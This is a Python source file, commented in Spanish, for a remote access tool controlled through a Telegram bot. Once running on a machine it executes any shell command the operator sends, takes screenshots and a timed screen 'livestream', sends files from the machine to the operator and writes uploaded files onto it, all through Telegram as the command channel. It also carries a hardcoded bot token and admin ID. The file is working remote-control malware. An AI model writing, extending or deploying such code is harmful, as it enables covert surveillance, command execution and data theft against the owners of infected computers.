import telebot
import subprocess
import requests
import socket
import os
import time
import threading
import io
from PIL import ImageGrab

# ================= CONFIGURACIÓN =================
BOT_TOKEN = "8983949384:AAHHEYWCthKnYUvO4IEzYRxfCk1rJgGh164"
ADMIN_ID = 8039044504  # Tu ID de Telegram
# =================================================

bot = telebot.TeleBot(BOT_TOKEN)

# --- UTILIDADES ---
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

def get_public_ip():
    try:
        return requests.get("https://api64.ipify.org?format=json", timeout=5).json()['ip']
    except:
        return "Desconocida"

CLIENT_ID = f"{get_local_ip()} | {socket.gethostname()}"

# --- VARIABLES GLOBALES ---
selected = False
livestream_active = False

def is_admin(message):
    return message.from_user.id == ADMIN_ID

# --- COMANDOS BÁSICOS ---
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not is_admin(message): return
    help_text = (
        f"🤖 Cliente `{CLIENT_ID}` listo.\n\n"
        "**Comandos disponibles:**\n"
        "`/list` - Listar clientes\n"
        "`/select <ID>` - Seleccionar este cliente\n"
        "`/exit` - Deseleccionar\n"
        "`screenshot` - Captura de pantalla\n"
        "`/download <ruta>` - Descargar archivo\n"
        "`/upload` - Subir archivo a la PC\n"
        "`/livestream <segundos>` - Transmisión en vivo\n"
        "`/stopstream` - Detener transmisión\n"
        "Cualquier otro comando se ejecuta en CMD."
    )
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['list'])
def list_clients(message):
    if not is_admin(message): return
    bot.send_message(message.chat.id, f"🖥️ `{CLIENT_ID}`\n   IP Pública: `{get_public_ip()}`", parse_mode='Markdown')

@bot.message_handler(commands=['select'])
def select_client(message):
    global selected
    if not is_admin(message): return
    try:
        target = message.text.split(" ", 1)[1].strip()
        if target in CLIENT_ID or CLIENT_ID in target:
            selected = True
            bot.reply_to(message, f"✅ Este cliente (`{CLIENT_ID}`) ha sido seleccionado.")
        else:
            selected = False
    except IndexError:
        bot.reply_to(message, "⚠️ Uso: `/select <ID>`", parse_mode='Markdown')

@bot.message_handler(commands=['exit'])
def exit_client(message):
    global selected, livestream_active
    if not is_admin(message): return
    if selected:
        selected = False
        livestream_active = False
        bot.reply_to(message, f"🔓 Cliente `{CLIENT_ID}` deseleccionado.")

# --- DESCARGA DE ARCHIVOS ---
@bot.message_handler(commands=['download'])
def download_file(message):
    if not is_admin(message) or not selected: return
    try:
        path = message.text.split(" ", 1)[1].strip()
        if not os.path.exists(path):
            bot.reply_to(message, f"❌ No existe: `{path}`", parse_mode='Markdown')
            return
        if os.path.isdir(path):
            bot.reply_to(message, "❌ Es una carpeta. Especifica un archivo.")
            return
        size = os.path.getsize(path)
        if size > 50 * 1024 * 1024:
            bot.reply_to(message, f"❌ Archivo muy grande ({size/1024/1024:.2f} MB). Límite: 50 MB.")
            return
        with open(path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📁 `{path}`")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

# --- SUBIDA DE ARCHIVOS ---
@bot.message_handler(content_types=['document'])
def upload_file(message):
    if not is_admin(message) or not selected: return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
        # Guardar en la carpeta actual con el nombre original
        filename = message.document.file_name
        with open(filename, 'wb') as f:
            f.write(downloaded)
        bot.reply_to(message, f"✅ Archivo guardado como: `{filename}`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"❌ Error al subir: {e}")

# --- TRANSMISIÓN EN VIVO (Capturas cada 2 segundos) ---
def livestream_thread(chat_id, duration):
    global livestream_active
    start_time = time.time()
    while livestream_active and (time.time() - start_time) < duration:
        try:
            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            # Reducir tamaño para que sea más rápido
            screenshot.thumbnail((1280, 720))
            screenshot.save(img_bytes, format='JPEG', quality=60)
            img_bytes.seek(0)
            bot.send_photo(chat_id, img_bytes, caption=f"🎥 Live ({int(time.time()-start_time)}s)")
        except Exception as e:
            print(f"Error en livestream: {e}")
        time.sleep(2)
    livestream_active = False
    bot.send_message(chat_id, "🛑 Transmisión finalizada.")

@bot.message_handler(commands=['livestream'])
def start_livestream(message):
    global livestream_active
    if not is_admin(message) or not selected: return
    try:
        duration = int(message.text.split(" ", 1)[1].strip())
        if duration > 300:
            bot.reply_to(message, "⚠️ Máximo 300 segundos por seguridad.")
            return
        if livestream_active:
            bot.reply_to(message, "⚠️ Ya hay una transmisión activa. Usa /stopstream.")
            return
        livestream_active = True
        bot.reply_to(message, f"🎥 Iniciando transmisión por {duration} segundos...")
        threading.Thread(target=livestream_thread, args=(message.chat.id, duration), daemon=True).start()
    except (IndexError, ValueError):
        bot.reply_to(message, "⚠️ Uso: `/livestream <segundos>` (ej: /livestream 30)", parse_mode='Markdown')

@bot.message_handler(commands=['stopstream'])
def stop_livestream(message):
    global livestream_active
    if not is_admin(message) or not selected: return
    livestream_active = False
    bot.reply_to(message, "🛑 Deteniendo transmisión...")

# --- COMANDO PRINCIPAL (CMD + screenshot) ---
@bot.message_handler(func=lambda message: True)
def execute_command(message):
    global selected
    if not is_admin(message) or not selected: return

    command = message.text

    if command.lower() == "exit":
        bot.reply_to(message, "👋 Cerrando...")
        bot.stop_polling()
        return

    # Captura de pantalla rápida
    if command.lower() == "screenshot":
        try:
            screenshot = ImageGrab.grab()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            bot.send_photo(message.chat.id, img_bytes, caption=f"📸 Captura de `{CLIENT_ID}`", parse_mode='Markdown')
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")
        return

    if command.lower() == "getip":
        output = f"IP Local: {get_local_ip()}\nIP Pública: {get_public_ip()}"
        bot.reply_to(message, f"```\n{output}\n```", parse_mode='Markdown')
        return

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        if not output:
            output = "[Sin salida]"
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e)

    if len(output) > 4000:
        output = output[:4000] + "\n... [truncado]"

    bot.reply_to(message, f"📤 `{CLIENT_ID}`:\n```\n{output}\n```", parse_mode='Markdown')

# --- INICIO ---
if __name__ == "__main__":
    print(f"[*] Cliente iniciado: {CLIENT_ID}")
    print("[*] Esperando comandos...")
    bot.infinity_polling()